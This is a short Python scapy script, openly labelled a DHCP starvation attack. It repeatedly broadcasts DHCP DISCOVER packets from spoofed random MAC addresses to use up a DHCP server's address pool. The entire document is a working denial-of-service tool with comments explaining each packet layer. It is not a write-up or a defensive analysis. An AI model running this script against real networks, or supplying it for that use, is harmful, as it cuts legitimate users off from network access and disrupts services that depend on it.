#DHCP Starvation Attack
# scapy - network tool to craft packets
from scapy.all import *
from time import sleep 
from randmac import RandMac
#Trying to starve 
def dhcp_starve():
    print("DHCP STARVATION \n") 
    #i - denotes the no of packets to be sent
    i=200;
    while(i>0):                        
    	# creation of spoofed random mac addresses
    	mac_add = RandMAC()
        # CREATION OF DHCP DISCOVER PACKETS
        # IN L2 LVL (LL)- spoofed mac to broadcast mac ff:ff:ff:ff
        # IN L3 LVL (IP)- 0.0.0.0 to 255.255.255.255
        # IN L4 LVL (UDP) - PORT 67 (SERVER) | PORT 68 (CLIENT) 
        # USING BOOTP PROTOCOL
    	pkt = Ether(src =mac_add,dst = "ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=mac_add)/DHCP(options=[("message-type","discover"),"end"])
        # SENDING THE PACKETS
    	sendp(pkt)
    	sleep(1)
    	i=i-1                     

if __name__=="__main__":
    dhcp_starve();
